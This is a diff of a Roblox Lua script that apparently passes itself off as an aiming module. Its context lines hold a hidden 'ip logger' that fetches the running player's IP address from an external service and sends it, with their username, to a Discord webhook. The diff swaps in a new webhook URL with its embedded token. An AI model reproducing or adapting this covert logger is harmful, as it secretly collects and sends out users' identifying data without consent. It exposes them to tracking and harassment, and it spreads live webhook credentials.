@@ -6,7 +6,7 @@ local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local name = game:GetService("Players").LocalPlayer.Name
 local msg = name.." : "..ip
 
-local webhook = "https://discord.com/api/webhooks/913667534773968897/Sgi_iPUF4UaxWbMXkDCBVZmpy8jUzys5wL5xvfPyRcs_f_gFQCr9iyYKAHrMDoR3bwZl"
+local webhook = "https://discord.com/api/webhooks/957749055780421652/yhTriDO4meSpkbUMpy-SusSq8W2cXh8AJy2D3siA02y4_LCZOD3WNcfGowSfM853MEks"
 local HttpService = game:GetService("HttpService");
 local botname = "ip logger"
 
@@ -32,6 +32,8 @@ function specials(Webhook, Message, Botname)
 end
 
 specials(webhook, msg, botname)
+
+
 
 if getgenv().Aiming then return getgenv().Aiming end
 
